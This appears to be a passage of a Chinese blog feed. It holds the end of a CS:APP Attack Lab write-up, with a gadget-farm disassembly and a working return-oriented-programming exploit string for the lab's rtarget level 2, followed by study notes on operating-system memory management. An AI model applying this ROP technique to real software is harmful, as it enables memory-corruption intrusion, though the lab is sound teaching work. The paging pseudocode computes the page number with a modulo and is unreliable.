-0x6f6f3177(%rdi),%eax</span><br><span class="line">  401a17:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a18 &lt;getval_345&gt;:</span><br><span class="line">  401a18:	b8 48 89 e0 c1       	mov    $0xc1e08948,%eax</span><br><span class="line">  401a1d:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a1e &lt;addval_479&gt;:</span><br><span class="line">  401a1e:	8d 87 89 c2 00 c9    	lea    -0x36ff3d77(%rdi),%eax</span><br><span class="line">  401a24:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a25 &lt;addval_187&gt;:</span><br><span class="line">  401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax</span><br><span class="line">  401a2b:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a2c &lt;setval_248&gt;:</span><br><span class="line">  401a2c:	c7 07 81 ce 08 db    	movl   $0xdb08ce81,(%rdi)</span><br><span class="line">  401a32:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a33 &lt;getval_159&gt;:</span><br><span class="line">  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax</span><br><span class="line">  401a38:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a39 &lt;addval_110&gt;:</span><br><span class="line">  401a39:	8d 87 c8 89 e0 c3    	lea    -0x3c1f7638(%rdi),%eax</span><br><span class="line">  401a3f:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a40 &lt;addval_487&gt;:</span><br><span class="line">  401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax</span><br><span class="line">  401a46:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a47 &lt;addval_201&gt;:</span><br><span class="line">  401a47:	8d 87 48 89 e0 c7    	lea    -0x381f76b8(%rdi),%eax</span><br><span class="line">  401a4d:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a4e &lt;getval_272&gt;:</span><br><span class="line">  401a4e:	b8 99 d1 08 d2       	mov    $0xd208d199,%eax</span><br><span class="line">  401a53:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a54 &lt;getval_155&gt;:</span><br><span class="line">  401a54:	b8 89 c2 c4 c9       	mov    $0xc9c4c289,%eax</span><br><span class="line">  401a59:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a5a &lt;setval_299&gt;:</span><br><span class="line">  401a5a:	c7 07 48 89 e0 91    	movl   $0x91e08948,(%rdi)</span><br><span class="line">  401a60:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a61 &lt;addval_404&gt;:</span><br><span class="line">  401a61:	8d 87 89 ce 92 c3    	lea    -0x3c6d3177(%rdi),%eax</span><br><span class="line">  401a67:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a68 &lt;getval_311&gt;:</span><br><span class="line">  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax</span><br><span class="line">  401a6d:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a6e &lt;setval_167&gt;:</span><br><span class="line">  401a6e:	c7 07 89 d1 91 c3    	movl   $0xc391d189,(%rdi)</span><br><span class="line">  401a74:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a75 &lt;setval_328&gt;:</span><br><span class="line">  401a75:	c7 07 81 c2 38 d2    	movl   $0xd238c281,(%rdi)</span><br><span class="line">  401a7b:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a7c &lt;setval_450&gt;:</span><br><span class="line">  401a7c:	c7 07 09 ce 08 c9    	movl   $0xc908ce09,(%rdi)</span><br><span class="line">  401a82:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a83 &lt;addval_358&gt;:</span><br><span class="line">  401a83:	8d 87 08 89 e0 90    	lea    -0x6f1f76f8(%rdi),%eax</span><br><span class="line">  401a89:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a8a &lt;addval_124&gt;:</span><br><span class="line">  401a8a:	8d 87 89 c2 c7 3c    	lea    0x3cc7c289(%rdi),%eax</span><br><span class="line">  401a90:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a91 &lt;getval_169&gt;:</span><br><span class="line">  401a91:	b8 88 ce 20 c0       	mov    $0xc020ce88,%eax</span><br><span class="line">  401a96:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a97 &lt;setval_181&gt;:</span><br><span class="line">  401a97:	c7 07 48 89 e0 c2    	movl   $0xc2e08948,(%rdi)</span><br><span class="line">  401a9d:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401a9e &lt;addval_184&gt;:</span><br><span class="line">  401a9e:	8d 87 89 c2 60 d2    	lea    -0x2d9f3d77(%rdi),%eax</span><br><span class="line">  401aa4:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401aa5 &lt;getval_472&gt;:</span><br><span class="line">  401aa5:	b8 8d ce 20 d2       	mov    $0xd220ce8d,%eax</span><br><span class="line">  401aaa:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401aab &lt;setval_350&gt;:</span><br><span class="line">  401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)</span><br><span class="line">  401ab1:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401ab2 &lt;end_farm&gt;:</span><br><span class="line">  401ab2:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  401ab7:	c3                   	retq   </span><br><span class="line">  401ab8:	90                   	nop</span><br><span class="line">  401ab9:	90                   	nop</span><br><span class="line">  401aba:	90                   	nop</span><br><span class="line">  401abb:	90                   	nop</span><br><span class="line">  401abc:	90                   	nop</span><br><span class="line">  401abd:	90                   	nop</span><br><span class="line">  401abe:	90                   	nop</span><br><span class="line">  401abf:	90                   	nop</span><br></pre></td></tr></table></figure>
<p>题目还提供了部分汇编指令的对应的字节表示:</p>
<p><img src="../../Lab-Notes/img/Byte encoding of instructions.png" alt="byte coding"></p>
<h3 id="RLevel2"><a href="#RLevel2" class="headerlink" title="RLevel2"></a>RLevel2</h3><p>题目本身与Ctarget一致, 区别在于源代码编译的过程中使用了ASLR与禁止栈执行. 笔记中前缀 R 以示区分.</p>
<p>先来回顾一下我们在Level2中干了什么, 我们将代码注入了缓冲区, 并运行之, 从而使得cookie写入rdi寄存器. </p>
<p>在本题中, 我们选择先将 cookie 存入栈中, 然后使用 pop 指令将cookie推入$rdi 寄存器.</p>
<p>然而很遗憾, farm中并没有 <code>pop $rdi</code>对应的指令 5f , 倒是 <code>pop $rax</code> 对应的58指令频繁出现, 我们于是考虑迂回作战, 先将cookie推入rax, 再使用 <code>mov $rax,$rdi</code> 完成目标.</p>
<p>farm中有很多条路径可以实现上述目标, 我选择的是 <code>&lt;getval_280&gt;</code> 与 <code>&lt;setval_426&gt;</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax</span><br><span class="line">  4019cf:	c3                   	retq  </span><br><span class="line">&#x2F;*</span><br><span class="line">起始于0x4019cc</span><br><span class="line">58 : pop $rax </span><br><span class="line">90 : no op</span><br><span class="line">c3 : retq</span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:	c3                   	retq   </span><br><span class="line">&#x2F;*</span><br><span class="line">起始于0x4019c5</span><br><span class="line">48 89 c7 : mov $rax,$rdi</span><br><span class="line">90 : no op</span><br><span class="line">c3 : retq</span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure>
<p>因此图解如下: </p>
<p><img src="../../Lab-Notes/img/Rtouch2_pic.png" alt="Rtouch2_pic"></p>
<p>答案为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">cc 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
<p>大功告成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;shell 输入</span><br><span class="line">.&#x2F;hex2raw &lt;in4.txt &gt; out4</span><br><span class="line">.&#x2F;rtarget -i out4 -q</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;shell 输出</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>2020年7月3日~7月8日. 完成了CS:APP 第三个配套实验 Attack Lab.</p>
<p>这个实验包括了大量的需要自学的内容, 涉及到内存中栈的管理, 函数跳转(retq)的方式, 缓冲区溢出错误, gets()等函数的缺陷等知识点. 了解并尝试了 代码注入攻击, 面向返回编程等代码攻击手段. 了解了 空间布局随机化, 栈禁止执行, 金丝雀区的设置 等代码防御方式.</p>
<p>提高了自学能力以及对 gdb 等调试工具的使用能力.</p>
<p>由于本实验最后一小题 RLevel3 本身并没有新知识点 但需要花费大量时间解题, 故暂时略去不做.</p>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>乘龙术</category>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>读书笔记:技术</tag>
        <tag>CSAPP</tag>
        <tag>Lab</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统之内存管理</title>
    <url>/2020/06/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<p>本章将会涉及到</p>
<ol>
<li>基本内存管理</li>
<li>Segmentation    分段 </li>
<li>Swap    交换 ⭐</li>
<li>Virtual   虚拟内存 ⭐</li>
<li>其他需要考虑的问题</li>
</ol>
<a id="more"></a>
<h2 id="基本内存管理"><a href="#基本内存管理" class="headerlink" title="基本内存管理"></a>基本内存管理</h2><p>本节会涉及到:</p>
<ol>
<li>储存层次</li>
<li>CPU利用率</li>
<li>重定位<ol>
<li>Base &amp; Limit</li>
<li>什么时候重定位</li>
</ol>
</li>
</ol>
<h3 id="储存层次"><a href="#储存层次" class="headerlink" title="储存层次"></a>储存层次</h3><p>参看计组部分, 不是重点, 略</p>
<h3 id="CPU利用率"><a href="#CPU利用率" class="headerlink" title="CPU利用率"></a>CPU利用率</h3><p>如果考虑到内存的存在, CPU的利用率还将会进一步降低.  如果CPU中同时存在 $n$ 个运行中的程序 (称为多道程序的度 degree) ,则 CPU利用率为</p>
<script type="math/tex; mode=display">
1-P^n</script><p>其中 $P$ 是IO等待时间的占比</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609124321.jpg" alt="1591668423275"></p>
<blockquote>
<ul>
<li>These  sizes allow 4 programs to be in memory at once. With an 80% average I/O wait, we have a CPU utilization of 1-0.8^4≈60%. </li>
<li>Adding another 16MB of memory allow 8 programs, thus raising the CPU utilization to 83%. </li>
<li>Adding yet another 16MB of memory allow 12 programs, only increase CPU utilization to 93%. </li>
<li>…97% </li>
</ul>
</blockquote>
<p>下图展示了实际CPU中的资源分配</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609124332.jpg" alt="1591668467874"></p>
<ul>
<li>0-10秒内 仅Job1 在工作. CPU利用率为 $1-0.8^1=0.2$ 相当于执行了 $10\times0.2=2 min$</li>
<li>10-15秒内 Job1/2 在工作. CPU利用率为 $1-0.8^2=0.36$ 平均每个任务相当于执行了 $5\times\frac{1}{2}\times0.36=0.9 min$</li>
<li>15-20 秒内 Job1/2/3 在工作. CPU利用率为 $1-0.8^3=0.49$ 平均每个任务相当于执行了 $5\times\frac{1}{3}\times0.49=0.8 min$</li>
<li>……</li>
</ul>
<h3 id="重定位"><a href="#重定位" class="headerlink" title="重定位"></a>重定位</h3><p>程序本身包含的数据是从零开始<del>的异世界生活</del> 而在实际运行中, 几乎不可能物理地址恰好从零开始, 因此需要将程序中的逻辑地址(也叫相对地址) 转换成物理地址. 这在CPU中是由 MMU (内存控制单元) 完成的.</p>
<h4 id="基址与限址-Base-amp-Limit"><a href="#基址与限址-Base-amp-Limit" class="headerlink" title="基址与限址   Base &amp; Limit"></a>基址与限址   Base &amp; Limit</h4><p>Base &amp; Limit 都是作为寄存器储存在PCB中, 每个进程都有一个. </p>
<p>Base 是逻辑地址0 在物理地址空间中的地址(的指针) , 也就是该进程在内存空间中开始的地方. </p>
<p>Limit 是进程所拥有的最大地址<strong>数目</strong>, Base + Limit 是 进程的最大地址</p>
<blockquote>
<p>​    eg Base = 10000   Limit = 4000  ➡ 最大地址为 14000</p>
</blockquote>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609124344.jpg" alt="重定位图"></p>
<p>如图, 逻辑地址先与limit比较, 无误后再加上base成为物理地址</p>
<h4 id="MMU"><a href="#MMU" class="headerlink" title="MMU"></a>MMU</h4><p>Memory Management Unit , 内存管理空间, 作用是将虚拟内存转化为实际的物理地址, 再将其送往数据Bus上.</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609124432.jpg" alt="mmu"></p>
<h4 id="什么时候发生重定位"><a href="#什么时候发生重定位" class="headerlink" title="什么时候发生重定位?"></a>什么时候发生重定位?</h4><p>一般来说有三种:</p>
<ol>
<li>编译时, 这种就要求编译之后的程序代码的地址必须是实际运行中的地址, 常用于直接烧录的嵌入式等.</li>
<li>载入时, 要求载入后程序在内存中的位置必定不变, 无法进行灵活地管理与切换</li>
<li>运行时, 支持交换 分页等操作</li>
</ol>
<hr>
<h2 id="Segmentation-分段"><a href="#Segmentation-分段" class="headerlink" title="Segmentation 分段"></a>Segmentation 分段</h2><p>在上述讨论中, 我们是把程序的所有东西整体放入内存中. 而事实上, 程序的数据包括代码段(Code), 数据段(Data), 堆栈段(Stack),….</p>
<p>可能出现的问题: 修改Data数据时误改了Code段; 批处理时可以复用代码段等.</p>
<p>所以采用分段.每一段的逻辑地址都从0 开始, 每一段都拥有自己的Base 与 Limit , 这些映射关系储存在段表中.</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609082725.jpg" alt="分段"></p>
<h3 id="分段的好处"><a href="#分段的好处" class="headerlink" title="分段的好处"></a>分段的好处</h3><ul>
<li>简化正在增长或缩小的数据结构的处理</li>
<li>简化了分别编译的过程的链接</li>
<li>便于在多个进程之间共享过程或数据</li>
<li>不同的段可以具有不同种类的保护策略</li>
</ul>
<h3 id="GDT-amp-LDT"><a href="#GDT-amp-LDT" class="headerlink" title="GDT &amp; LDT"></a>GDT &amp; LDT</h3><p>每个进程拥有自己的LDT (Local Descriptor Table) 用于储存进程中每个段的Base等数据.</p>
<p>OS 拥有一个GDT (Global  Descriptor Table) </p>
<p>存疑 GDT是用来干什么的?</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609125624.jpg" alt=""></p>
<h3 id="段的大小"><a href="#段的大小" class="headerlink" title="段的大小"></a>段的大小</h3><p>一般 Inter 16K段, 每段拥有1 billion 32-bit words</p>
<h3 id="分段与换页的比较"><a href="#分段与换页的比较" class="headerlink" title="分段与换页的比较"></a>分段与换页的比较</h3><p><img width="2000" src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609125600.jpg"></img></p>
<p>实际实现中大部分使用段页式. 每段中再使用分页机制.</p>
<hr>
<h2 id="Swap-交换"><a href="#Swap-交换" class="headerlink" title="Swap 交换"></a>Swap 交换</h2><p>本小节涉及到:</p>
<ol>
<li>交换的概念</li>
<li>碎片/空洞</li>
<li>⭐内存管理机制<ol>
<li>位图    bit map    </li>
<li>链表    list</li>
</ol>
</li>
<li>⭐内存的分配机制</li>
</ol>
<p>先前说到内存空间的大小远远不够支撑所有进程同时使用. 这被称作 <strong>内存过载,</strong> 因此Swap 出现了, 基本思想是谁用, 内存资源给谁. 当另外一个进程需要CPU资源时, 将原先的进程撤出, 换入目标进程.</p>
<p>内存分区的可以分成固定大小, 缺点是会造成空间的浪费, 并且无法运行大于分区大小的程序. </p>
<p>分区大小也可以是可变的, 但是随着时间会有碎片(空洞, Holes) 的产生</p>
<h3 id="Holes-空洞"><a href="#Holes-空洞" class="headerlink" title="Holes 空洞"></a>Holes 空洞</h3><p>空洞的产生</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609124358.jpg" alt=""></p>
<p>空洞还是难以清除的. 内存是处在高速变化中的, 试图将碎片合并为更大的内存空间片式必须要将目前的进程停滞. 对外表现为长达数十秒甚至分钟的机器假死, 是不可被忍受的.</p>
<h3 id="内存的管理机制⭐"><a href="#内存的管理机制⭐" class="headerlink" title="内存的管理机制⭐"></a>内存的管理机制⭐</h3><p>将内存划分为更加精细的等大片段, 并记录其是否处于使用中, 如下图</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609124410.jpg" alt="内存管理"></p>
<h4 id="位图"><a href="#位图" class="headerlink" title="位图"></a>位图</h4><p>如图B, 1表示使用中, 0表示未使用.</p>
<p>pro: 便于管理, 修改只需要取非操作即可</p>
<p>con: 难于查找, 每次必须查找n位连续的0; 实际位图很大</p>
<h4 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h4><p>如图C, P表示process, H表示holes, 第二位表示开始位, 第三位表示长度.</p>
<p>pro: 便于查找, 只需要比较长度, 节约管理成本.</p>
<p>con: 难于管理, 归还内存时要合并空洞, 合并内存时要分裂空洞</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609124419.jpg" alt="合并空洞"></p>
<h3 id="内存的分配机制"><a href="#内存的分配机制" class="headerlink" title="内存的分配机制"></a>内存的分配机制</h3><h4 id="First-fit"><a href="#First-fit" class="headerlink" title="First fit"></a>First fit</h4><p>从0开始找到第一个合适的</p>
<h4 id="Next-fit"><a href="#Next-fit" class="headerlink" title="Next fit"></a>Next fit</h4><p>从上一次查找结束的地方开始找到第一个合适的</p>
<h4 id="Best-fit"><a href="#Best-fit" class="headerlink" title="Best fit"></a>Best fit</h4><p>在所有空洞中找<strong>最略大于</strong>所需内存的空洞</p>
<h4 id="Worst-fit"><a href="#Worst-fit" class="headerlink" title="Worst fit"></a>Worst fit</h4><p>在所有空洞中找<strong>最大于</strong>所需内存的空洞</p>
<h4 id="Quick-fit"><a href="#Quick-fit" class="headerlink" title="Quick fit"></a>Quick fit</h4><p>随机查找空洞, 只要够用就安排</p>
<ul>
<li><p>Fist , Next , Quick 方式 , 只要找到能用的即可, 不考虑空洞体量是否与所需要的符合.</p>
</li>
<li><p>Best 问题:</p>
<ul>
<li>碎片产生的太多且小</li>
<li>查找过程太慢</li>
</ul>
</li>
<li><p>Worst 问题</p>
<ul>
<li>迅速消耗大空洞</li>
<li>查找过程太慢</li>
</ul>
</li>
<li><p>实际性能最好的是 Quick fit</p>
<p><del>这就是无招胜有招吗 👴就是风清扬, i了i了</del></p>
</li>
</ul>
<h2 id="Virtual-Memory-虚拟内存"><a href="#Virtual-Memory-虚拟内存" class="headerlink" title="Virtual Memory 虚拟内存"></a>Virtual Memory 虚拟内存</h2><p>本节包括:</p>
<ol>
<li>分页</li>
<li>多级页表<ol>
<li>页表每项对应大小</li>
<li>页表包括的内容</li>
</ol>
</li>
<li>TLB 快表</li>
<li><del>反转页表</del></li>
</ol>
<h3 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h3><p>先前都是按照最大需要的内存来划分空间的. 实际上很多时候是用不到这些空间的. 因此我们在把每个进程(或者段)拆分, 当前使用中的部分在内存中, 其他部分放在磁盘中. </p>
<p>将进程(或段) 的虚拟空间地址分成一定大小的<strong>页(Page)</strong> , 该操作称为分页.</p>
<p>将进程(或段) 的物理空间地址分成一定大小的<strong>页帧(Frame)</strong> , 页与页帧的大小是一样大的. 但是页的数量比页帧的数量多.</p>
<p>当进程发现所需要的数据所在的页不在内存, 而在磁盘中时, 会发生<strong>页面失效(Page Fault)</strong> , 并通过页面调度将内存中某一页调出, 调入目标页. </p>
<h4 id="分页过程"><a href="#分页过程" class="headerlink" title="分页过程"></a>分页过程</h4><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609125322.jpg" alt="分页"></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//分页算法  伪代码</span></span><br><span class="line">address ad_lo 	<span class="comment">//逻辑地址,已知</span></span><br><span class="line">address ad_phy	<span class="comment">//(内存中的)物理地址,待求</span></span><br><span class="line">address* Base	<span class="comment">//已知</span></span><br><span class="line">size	 Limit	<span class="comment">//已知</span></span><br><span class="line">size 	page_size	<span class="comment">//每一页的大小, 一般与页帧大小相同,已知</span></span><br><span class="line">pageTable table[]	<span class="comment">//页表,已知</span></span><br><span class="line"><span class="keyword">int</span> pageNo		<span class="comment">//页号,未知</span></span><br><span class="line"><span class="keyword">int</span> frameNo		<span class="comment">//页帧号,未知</span></span><br><span class="line"></span><br><span class="line">getAd_Phy()&#123;</span><br><span class="line">	<span class="keyword">if</span> (ad_lo &gt; *(Base + Limit) )</span><br><span class="line">		<span class="keyword">throw</span> error(<span class="string">"地址越界!"</span>)</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		pageNo = ad_lo % page_size	<span class="comment">//页号</span></span><br><span class="line">		offset = ad_lo - pageNo * page_size		<span class="comment">//页内偏移量</span></span><br><span class="line">		frameNo = table[PageNo]		<span class="comment">//页帧号</span></span><br><span class="line">		<span class="keyword">if</span> (frameNo == null)</span><br><span class="line">			<span class="keyword">throw</span> error(<span class="string">"页面失效!"</span>)</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			ad_phy = frameNo * page_size + offset</span><br><span class="line">			<span class="keyword">return</span> ad_phy</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/img_1173.png" alt="练习"></p>
<h4 id="分页优点"><a href="#分页优点" class="headerlink" title="分页优点"></a>分页优点</h4><ol>
<li>进程大小不受物理内存大小的限制</li>
<li>每个进程需要的内存更小</li>
<li>更多进程可以并发运行</li>
<li>IO 更少</li>
</ol>
<h4 id="分页场景"><a href="#分页场景" class="headerlink" title="分页场景"></a>分页场景</h4><ol>
<li><p>进程创建时</p>
<ul>
<li><p>确定程序体量</p>
</li>
<li><p>创建进程表</p>
</li>
</ul>
</li>
<li><p>程序执行时</p>
<ul>
<li><p>MMU刷新</p>
</li>
<li><p>TLB刷新</p>
</li>
</ul>
</li>
<li><p>页面失效时</p>
<ul>
<li>判断失效页面, 确定调入页面</li>
<li>确定并调出调出页面</li>
<li>调入调入页面</li>
</ul>
</li>
<li><p>程序结束</p>
<ul>
<li>释放资源</li>
</ul>
</li>
</ol>
<h3 id="多级页表"><a href="#多级页表" class="headerlink" title="多级页表"></a>多级页表</h3><p>实际上页表很大($2^{32}$), 但是我们要求它快!</p>
<ol>
<li><p>将页表放在硬件(寄存器)中</p>
<p>不现实</p>
</li>
<li><p>页表放在软件(内存)中</p>
<p>效率低</p>
</li>
</ol>
<p>多级列表,字面意思,  应该很好懂.</p>
<p><strong>每项的大小</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>PT1</th>
<th>PT2</th>
<th>Offset</th>
</tr>
</thead>
<tbody>
<tr>
<td>10 $bits$</td>
<td>10  $bits$</td>
<td>12  $bits$</td>
</tr>
</tbody>
</table>
</div>
<p>那么总虚拟地址空间大小为 $2^{10+10+12} = 4G$ ,一级页表中每项对应的实际上是 $2^{10+12} = 4M$ 地址空间, 二级页表实际上是$2^{12} = 4K$</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609125441.jpg" alt="页面大小"></p>
<p><strong>实际上页表还包括</strong></p>
<ol>
<li>Page frame number 页帧号</li>
<li>Present /absent  若为1 ,表示该页对应物理地址在内存中</li>
<li>Protection  标识访问权限, R/W/X</li>
<li>Modified    标识是否修改过, 若1, 调出时需要写入磁盘</li>
<li>Referenced  最近是否被访问, 用于页面调度算法的参考</li>
<li>Caching disabled   不懂</li>
</ol>
<h3 id="TLB-快表"><a href="#TLB-快表" class="headerlink" title="TLB 快表"></a>TLB 快表</h3><p>根据二八原则, 20% 的页面被访问80%次, 将它们记录在硬件上, 直查物理地址</p>
<p>剩下的80%再跑去页表查</p>
<p>这一块硬件称为 <strong>转换检测缓冲区  (Translation Lookaside Buffers, TLB, 又称快表)</strong></p>
<p>TLB包括的内容与页表大致相同, 但是更快!</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609125452.jpg" alt="内容"></p>
<p>当页面访问在内存中不在TLB中时, 产生软失效, 更新一下TLB;</p>
<p>当页面访问不在内存中(更不在TLB中)时, 产生硬失效, 磁盘存取以装入该页面;</p>
<p><em><u>如果是段页式, TLB 中还有段号</u></em></p>
<h3 id="反转页表"><a href="#反转页表" class="headerlink" title="反转页表"></a>反转页表</h3><p>没听, 好像是从页帧转页, 但是不重要(了解一下)</p>
<hr>
<h2 id="页面调度算法"><a href="#页面调度算法" class="headerlink" title="页面调度算法"></a>页面调度算法</h2><p>本节包括</p>
<ol>
<li>最优PRA</li>
<li>NRU  最近未使用</li>
<li>FIFO  </li>
<li>SC  第二机会</li>
<li>Clock PRA</li>
<li>LRU<ol>
<li>硬件实现</li>
<li>软件实现</li>
</ol>
</li>
<li>Working Set</li>
<li>WSClock </li>
</ol>
<p>因为很重要所以单独拉出来一点讲了</p>
<ul>
<li><p>刚才提到页面失效,  并随后进行页面调度. 调入的页面是明确的, 但是把什么调出呢? 这就是页面调度算法<strong>(Page Replacement Algorithms ,PRA)</strong></p>
</li>
<li><p>除了页面失效外在别的地方也有使用 例如</p>
<ul>
<li>缓存</li>
<li>搜索引擎的热点</li>
</ul>
</li>
</ul>
<h3 id="最优-Optimal-Page-Replacement-Algorithm"><a href="#最优-Optimal-Page-Replacement-Algorithm" class="headerlink" title="最优 Optimal Page Replacement Algorithm"></a>最优 Optimal Page Replacement Algorithm</h3><p>每次都将未来最远不会用到的调走</p>
<p><del>废话但是我怎么知道啷个是未来不会用到的啊</del></p>
<p>该算法的唯一问题在于不可实现. <del>这句话笑死我了</del></p>
<p>所以这个算法没有实际意义, 用于评价其他算法的性能</p>
<h3 id="Not-Recently-Used-NRU-最近未使用"><a href="#Not-Recently-Used-NRU-最近未使用" class="headerlink" title="Not Recently Used (NRU, 最近未使用)"></a>Not Recently Used (NRU, 最近未使用)</h3><p>每个页码都有 Reference bit, Modified bit  (是否被访问, 修改位)</p>
<p>按照以下顺序调出:</p>
<ol>
<li>not referenced, not modified </li>
<li>not referenced, modified</li>
<li>referenced, not modified </li>
<li>referenced, modified</li>
</ol>
<h3 id="FIFO-PRA"><a href="#FIFO-PRA" class="headerlink" title="FIFO PRA"></a>FIFO PRA</h3><p>先进先出</p>
<p>con: 经常将访问过, 修改过的位调出</p>
<p>下面是它的改进</p>
<h3 id="Second-Chance-PRA"><a href="#Second-Chance-PRA" class="headerlink" title="Second Chance PRA"></a>Second Chance PRA</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;SC PRA</span><br><span class="line">while(页面到队头)&#123;</span><br><span class="line">	if(referenceBit &#x3D;&#x3D; 0)</span><br><span class="line">		调出;</span><br><span class="line">	else &#123;</span><br><span class="line">		referenceBit &#x3D; 0;</span><br><span class="line">		页面出队;</span><br><span class="line">		页面入队; 	&#x2F;&#x2F;就是扔回队尾了</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
